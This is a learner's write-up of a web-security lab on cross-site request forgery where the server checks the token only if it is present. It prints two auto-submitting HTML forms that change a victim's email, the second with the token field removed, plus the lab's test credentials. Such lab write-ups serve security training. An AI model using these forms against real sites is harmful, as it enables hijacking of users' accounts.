## Detailed Writeup of Csrf Practitioner Lab(**CSRF where token validation depends on token being present**)

Date:-8 January 2025
Level:-Practitioner

As the lab is based on token validation therefore,i started the lab with entering the email and password given to us

# Username-wiener
# Password-peter

After login i get the option to update my email and i enter the testing mail and capture the request at *Burp proxy*
 
Then i capture the request and send it to *Burp Repeater* and used **Engagement Tools** and generated a **CSRF poc GENERATOR**.

The Html code generated is given below:-

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa700eb042d67968165118e00420081.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="testing&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="RtEjFoSQVv7LGt56USmMAx5AjHPyBdjS" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>


After recieving the lab details i copied it and go back to lab dasboard wher i get the **exploit server**.

# I simply put the code in the html feild and store it to website server.
# Then,i moved my code to victim server and modify the request by changing the mail address and removing the **Csrf Token Field** from the code.

The modified code is shown below:-

```html
<html>
  <body>
    <form action="https://0aa700eb042d67968165118e00420081.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="testing123&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>


# Boom! we finally exploit the victim server and solbved the lab.

**Key-Learning**:- If the token is present make sure to validate the token while adding its value as well as proper validation if it gets manually remove or omitted.

Thankyou!!!
